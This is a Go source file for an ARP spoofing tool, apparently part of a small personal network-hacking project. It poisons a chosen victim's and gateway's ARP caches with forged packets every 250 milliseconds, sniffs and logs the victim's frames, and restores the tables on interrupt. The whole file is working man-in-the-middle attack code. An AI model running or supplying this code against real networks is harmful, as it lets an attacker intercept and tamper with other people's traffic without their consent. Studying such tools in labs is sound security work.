package arpoof

import (
	"bytes"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"time"

	hdisc "github.com/KennyZ69/HdiscLib"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func Spoof(target, gateway hdisc.DevData) {
	log.Println("Starting spoofing function")
	stop := make(chan struct{}, 2) // INFO: len 2 because I need to cancel the reading and writing

	ifi, err := hdisc.LocalIface()
	if err != nil {
		log.Fatalf("Error getting local net interface: %s\n", err)
	}

	handle, err := pcap.OpenLive(ifi.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error opening pcap.Handle: %s\n", err)
	}
	defer handle.Close()

	ownIP, _, err := hdisc.GetLocalNet()
	if err != nil {
		log.Fatalf("Error getting local ipnet and ip: %s\n", err)
	}

	localDev := &hdisc.DevData{IP: ownIP, Mac: ifi.HardwareAddr}

	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt)
	go func() {
		for range c {
			log.Println("Exiting spoofing gracefully ... ")
			close(stop)
		}
	}()

	// go readARP(handle, stop, ifi)
	go readARP(handle, stop, target, gateway)

	<-WriteARPPack(handle, *localDev, target, time.Millisecond*250, stop)

	<-RestoreARPTables(handle, gateway, target)
	// when there is a signal to stop from writing, continue to return
	return
}

// as the attackMac a nil can be passed if you want your local machine as the middle man
func WriteARPPack(handle *pcap.Handle, attacker, target hdisc.DevData, timeout time.Duration, stop chan struct{}) chan struct{} {

	stopped := make(chan struct{})

	go func(stopped chan struct{}) {
		t := time.NewTicker(timeout)
		for {
			select {
			case <-stop:
				log.Println("ARP Spoofing stopped!")
				stopped <- struct{}{}
				return
			default:
				<-t.C
				// as I am spoofing just one target I should end when there is an error I guess
				p, err := NewARPReq(attacker, target)
				if err != nil {
					// error building new arp request for spoofing
					log.Printf("Error creating arp request: %s\n", err)
					continue
				}
				if err = handle.WritePacketData(p); err != nil {
					// error writing packet to open handle
					log.Printf("Error writing packet to handle: %s\n", err)
					continue
				}

				p, err = NewARPRep(attacker, target)
				if err != nil {
					log.Printf("Error creating arp reply: %s\n", err)
					continue
				}
				if err = handle.WritePacketData(p); err != nil {
					log.Printf("Error writing packet to handle: %s\n", err)
					continue
				}
				log.Printf("Sending ARP packet: (%s:%s) -> (%s:%s)\n", attacker.IP.String(), attacker.Mac.String(), target.IP.String(), target.Mac.String())
			}
		}
	}(stopped)

	return stopped
}

func RestoreARPTables(handle *pcap.Handle, gateway, victim hdisc.DevData) chan struct{} {
	log.Println("Restoring ARP tables on the victim machine...")
	stopCh := make(chan struct{})

	// go func() {
	// 	t := time.NewTicker(time.Second * 5)
	// 	<-t.C
	// 	close(stopCh)
	// }()
	//
	// return WriteARPPack(handle, gateway, victim, time.Millisecond*200, stopCh)

	go func() {
		t := time.NewTicker(time.Millisecond * 250)
		resDur := time.NewTimer(time.Second * 5)

		for {
			select {
			case <-resDur.C:
				t.Stop()
				close(stopCh)
				return
			case <-t.C:
				// Restore victim's view: "Gateway is at its real MAC"
				p, err := NewARPRep(gateway, victim)
				if err != nil {
					log.Printf("Error creating victim restoration packet: %v\n", err)
					continue
				}
				if err := handle.WritePacketData(p); err != nil {
					log.Printf("Error sending to victim: %v\n", err)
				}

				// Restore gateway's view: "Victim is at its real MAC"
				p, err = NewARPRep(victim, gateway)
				if err != nil {
					log.Printf("Error creating gateway restoration packet: %v\n", err)
					continue
				}
				if err := handle.WritePacketData(p); err != nil {
					log.Printf("Error sending to gateway: %v\n", err)
				}

				log.Println("Sent ARP restoration packets")
			}
		}
	}()

	return stopCh
}

// func readARP(handle *pcap.Handle, stop chan struct{}, ifi *net.Interface) {
func readARP(handle *pcap.Handle, stop chan struct{}, target, gateway hdisc.DevData) {
	ps := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	packets := ps.Packets()
	for {
		select {
		case <-stop:
			return
		case p := <-packets:
			// 	arpLayer := p.Layer(layers.LayerTypeARP)
			// 	if arpLayer == nil {
			// 		continue
			// 	}
			// 	pack := arpLayer.(*layers.ARP)
			// 	if !bytes.Equal([]byte(ifi.HardwareAddr), pack.SourceHwAddress) {
			// 		continue
			// 	}
			// 	if pack.Operation == layers.ARPReply {
			// 		// idk
			// 	}
			// 	log.Printf("ARP packet (%d): %v (%v) -> %v (%v)\n", pack.Operation, net.IP(pack.SourceProtAddress), net.HardwareAddr(pack.SourceHwAddress), net.IP(pack.DstProtAddress), net.HardwareAddr(pack.DstHwAddress))

			ethLayer := p.Layer(layers.LayerTypeEthernet)
			if ethLayer == nil {
				continue
			}
			pack := ethLayer.(*layers.Ethernet)

			if bytes.Equal(pack.SrcMAC, target.Mac) || bytes.Equal(pack.DstMAC, target.Mac) {
				log.Printf("\nCaptured packet: %v -> %v | Length: %d bytes\n", pack.SrcMAC, pack.DstMAC, len(p.Data()))
			}
		}
	}
}
